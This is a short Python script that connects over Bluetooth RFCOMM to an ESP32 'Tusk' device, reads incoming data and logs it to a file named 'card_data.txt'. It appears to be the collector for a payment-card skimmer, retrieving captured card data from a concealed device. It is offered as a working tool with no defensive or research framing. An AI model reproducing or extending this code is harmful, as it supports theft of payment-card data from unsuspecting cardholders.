import re
import sys
import socket
import argparse

def validate_mac(mac_hwaddr):
    mac_validation = bool(re.match(r"([0-9A-F]{2}[:]){5}[0-9A-F]{2}", string=mac_hwaddr, flags=re.IGNORECASE))
    if mac_validation is False:
        print(f"[!] Invalid MAC address: {mac_hwaddr}")
        sys.exit(1)

parser = argparse.ArgumentParser()
parser.add_argument("--hwaddr", type=str, metavar="78:E3:6D:18:F5:DA", required=True, help="ESP32/Tusk Bluetooth device MAC address")
args = parser.parse_args()
mac_hwaddr = args.hwaddr
validate_mac(mac_hwaddr)


port = 1 
size = 1024
logfile = open("card_data.txt", "a")
data = b""

try:
    s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    s.connect((mac_hwaddr, port))

except socket.error as serr:
    print(f"[!] Socket Error: {serr}")
    sys.exit(1)

try:
    while True:        
        packet = s.recv(size)
        if len(packet) <= 0:
            break
        data += packet
        # due to the way tcp streaming works, not guaranteed to have all card data in one chunk
        # so we wait until the length of the data is at least over 60 (which should* be all the card data)
        # TODO: better way to do this?
        if len(data) > 60:
            logfile.write("[+]" + data.decode() + "\n")
            print(f"[+] {data.decode()}")
            data = b""
        
except:	
    print("[*] Exiting...")	
    s.close()
    logfile.close()
    sys.exit(0)
